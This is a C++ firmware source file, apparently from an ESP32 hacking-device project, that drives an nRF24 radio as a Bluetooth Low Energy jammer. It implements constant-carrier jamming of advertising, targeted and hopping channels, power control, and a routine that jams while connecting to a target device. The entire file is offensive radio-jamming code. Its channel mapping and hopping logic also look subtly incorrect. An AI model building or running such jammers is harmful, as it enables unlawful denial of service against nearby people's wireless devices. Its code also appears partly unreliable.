#include "nrf_jammer_api.h"
#include "nrf_jammer.h"
#include "core/display.h"
#include "modules/ble/BLE_Suite.h"
#include <RF24.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static bool nrf24Initialized = false;
static bool bleJammingActive = false;
static BLEJamMode currentMode = BLE_JAM_ADV_CHANNELS;
static rf24_pa_dbm_e currentPowerLevel = RF24_PA_MAX;
static unsigned long lastChannelHop = 0;
static int currentChannelIndex = 0;
static int targetChannel = 0;
static bool isHopping = false;
static unsigned long jamStartTime = 0;

static byte bleAdvertisingChannels[] = {37, 38, 39};
static byte bleDataChannels[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17,
                                  18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36};

bool isNRF24Available() {
    if (!nrf24Initialized) {
        NRF24_MODE mode = nrf_setMode();
        if (nrf_start(mode)) {
            if (CHECK_NRF_SPI(mode)) {
                NRFradio.setPALevel(RF24_PA_MAX);
                NRFradio.setAddressWidth(3);
                NRFradio.setPayloadSize(2);
                NRFradio.setDataRate(RF24_2MBPS);
            }
            nrf24Initialized = true;
        }
    }
    return nrf24Initialized;
}

bool startBLEJammer(BLEJamMode mode, int param) {
    if (!isNRF24Available()) return false;
    currentMode = mode;
    NRF24_MODE nrfMode = nrf_setMode();
    if (!CHECK_NRF_SPI(nrfMode)) return false;

    switch(mode) {
        case BLE_JAM_ADV_CHANNELS:
            NRFradio.startConstCarrier(currentPowerLevel, bleAdvertisingChannels[0]);
            isHopping = false;
            break;
        case BLE_JAM_ALL_CHANNELS:
            NRFradio.startConstCarrier(currentPowerLevel, 0);
            isHopping = false;
            break;
        case BLE_JAM_TARGET_CHANNEL:
            if (param >= 0 && param <= 39) {
                targetChannel = param;
                NRFradio.startConstCarrier(currentPowerLevel, targetChannel);
                isHopping = false;
            }
            break;
        case BLE_JAM_HOP_ADV:
            NRFradio.startConstCarrier(currentPowerLevel, bleAdvertisingChannels[0]);
            isHopping = true;
            currentChannelIndex = 0;
            break;
        case BLE_JAM_HOP_ALL:
            NRFradio.startConstCarrier(currentPowerLevel, 0);
            isHopping = true;
            currentChannelIndex = 0;
            break;
        case BLE_JAM_CONNECT_ATTACK:
            isHopping = false;
            jamStartTime = millis();
            break;
    }

    bleJammingActive = true;
    jamStartTime = millis();
    return true;
}

void updateBLEJammer() {
    if (!bleJammingActive) return;
    if (isHopping && (millis() - lastChannelHop > 100)) {
        byte* channels = NULL;
        int channelCount = 0;
        if (currentMode == BLE_JAM_HOP_ADV) {
            channels = bleAdvertisingChannels;
            channelCount = 3;
        } else if (currentMode == BLE_JAM_HOP_ALL) {
            if (currentChannelIndex < 36) {
                channels = bleDataChannels;
                channelCount = 36;
            } else {
                channels = bleAdvertisingChannels;
                channelCount = 3;
            }
        }
        if (channels && channelCount > 0) {
            currentChannelIndex = (currentChannelIndex + 1) % channelCount;
            NRFradio.setChannel(channels[currentChannelIndex]);
            lastChannelHop = millis();
        }
    }
}

void stopBLEJammer() {
    if (!bleJammingActive) return;
    NRF24_MODE mode = nrf_setMode();
    if (CHECK_NRF_SPI(mode)) NRFradio.stopConstCarrier();
    bleJammingActive = false;
    isHopping = false;
    currentChannelIndex = 0;
}

bool isBLEJammingActive() {
    return bleJammingActive;
}

int getCurrentBLEChannel() {
    if (!bleJammingActive) return -1;
    if (currentMode == BLE_JAM_TARGET_CHANNEL) return targetChannel;
    if (isHopping) {
        if (currentMode == BLE_JAM_HOP_ADV && currentChannelIndex < 3) {
            return bleAdvertisingChannels[currentChannelIndex];
        } else if (currentMode == BLE_JAM_HOP_ALL) {
            if (currentChannelIndex < 36) {
                return bleDataChannels[currentChannelIndex];
            } else {
                return bleAdvertisingChannels[currentChannelIndex - 36];
            }
        }
    }
    return -1;
}

void setBLEJammingPower(int powerLevel) {
    rf24_pa_dbm_e paLevel = RF24_PA_MIN;
    if (powerLevel == 0) paLevel = RF24_PA_MIN;
    else if (powerLevel == 1) paLevel = RF24_PA_LOW;
    else if (powerLevel == 2) paLevel = RF24_PA_HIGH;
    else if (powerLevel == 3) paLevel = RF24_PA_MAX;
    else return;
    
    currentPowerLevel = paLevel;
    if (bleJammingActive) {
        stopBLEJammer();
        startBLEJammer(currentMode, targetChannel);
    }
}

bool jamBLEChannel(int channel) {
    if (channel < 0 || channel > 39) return false;
    return startBLEJammer(BLE_JAM_TARGET_CHANNEL, channel);
}

bool jamBLEAdvertisingChannels() {
    return startBLEJammer(BLE_JAM_ADV_CHANNELS);
}

bool jamBLEConnectionChannel(NimBLEAddress target) {
    return startBLEJammer(BLE_JAM_ADV_CHANNELS);
}

bool jamDuringConnect(NimBLEAddress target) {
    if (!isNRF24Available()) return false;
    startBLEJammer(BLE_JAM_ADV_CHANNELS);
    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    stopBLEJammer();
    if (pClient) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return true;
    }
    return false;
}